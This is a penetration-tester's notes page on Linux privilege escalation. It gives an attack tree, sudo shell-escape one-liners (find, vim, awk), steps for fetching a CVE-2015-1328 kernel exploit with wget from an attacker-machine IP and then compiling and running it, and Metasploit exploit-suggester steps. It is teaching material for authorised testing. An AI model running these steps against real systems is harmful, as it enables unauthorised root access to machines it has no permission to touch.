# Privilege escalation on Linux

## Attack tree

```text
2 Become root on Linux
    2.1 Find an exploit (software bug) in the operating system or other system services, for example a kernel exploit (OR)
        2.1.1 Detect vulnerabilities (AND)
        2.1.2 Develop or acquire exploit code (AND)
        2.1.3 Transfer the exploit to the target machine (AND)
        2.1.4 Execute the exploit on the target
    2.2 Find a misconfiguration in an existing legitimate tool, for example sudo
        2.2.1 Find which commands current user is allowed to use (sudo -l) (AND)
        2.2.2 Exploit the parameters of a command that is allowed to be executed with root permissions
            2.2.2.1 sudo find /etc/passwd -exec /bin/sh \; (OR)
            2.2.2.2 sudo vim -c '!sh' (OR)
            2.2.2.3 sudo awk 'BEGIN {system(“/bin/sh”)}' (OR)
            2.2.2.4 Other commands that are allowed to be executed with root permissions to invoke a shell
    2.3 Other privilege escalation
```

## Examples

### Kernel exploit CVE-2015-1328

For [CVE-2015-1328](https://ubuntu.com/security/CVE-2015-1328) exploit-db lists several possible exploits:

* [37292](https://www.exploit-db.com/exploits/37292)
* [37293](https://www.exploit-db.com/exploits/37293)
* [40688](https://www.exploit-db.com/exploits/40688) <= Metasploit, maybe there are other exploits too

#### Using 37292

1. Create a local file CVE-2015-1328.c in the `/tmp/` directory and paste the code in the file
2. Start a local python http server: `python -m http.server 8080`
3. From the target machine: `wget http://<IP address attack machine>:8888/CVE-2015-1328.c`
4. Compile on target machine: `gcc CVE-2015-1328.c -o exp`
5. Check current user: `id`
6. Run the compiled exploit: `./exp`
7. Check current user: `id`

#### Using 40688

1. Start a `meterpreter` session
2. Load the `local_exploit_suggester` module in `msfconsole`: `meterpreter> use post/multi/recon/local_exploit_suggester`
3. Set the SESSION option for the module to the session ID of the meterpreter session
4. `run`
5. Test the exploit modules recommended by `local_exploit_suggester`. The first few modules in the output usually 
have a higher chance of working successfully.
6. Load a module and set the module options
7. `exploit`
8. An exploit can fail for many reasons. If not works, try the next one or install missing components for it to run.

## Notes

* In horizontal privilege escalation an adversary expands privileges by taking over another account.
* In vertical privilege escalation an attacker attempts to gain more permissions or access with an existing compromised account.

### Kernel exploits

A failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of 
the penetration testing engagement before attempting a kernel exploit. 

Kernel exploit methodology:

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and 
wget respectively. 

## Tools

* [LinEnum](https://github.com/rebootuser/LinEnum)
* [PEASS-ng](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) is a script that searches for possible paths to escalate privileges on Linux/Unix* hosts. It also enumerates the system.
* [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2) returns a list of possible CVEs, exploits, and exploit POCs (Proof of Concept) for the running Linux kernel.
* [GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can used to bypass local security restrictions in misconfigured systems.
* [Traitor](https://github.com/liamg/traitor) takes advantage of local misconfigurations and vulnerabilities (including most of GTFOBins) in order to pop a root shell. These are primarily misconfigurations, not exploits.


## Cheatsheets

* [Linux post exploitation enumeration](cheatsheets:docs/enumeration/linux-post)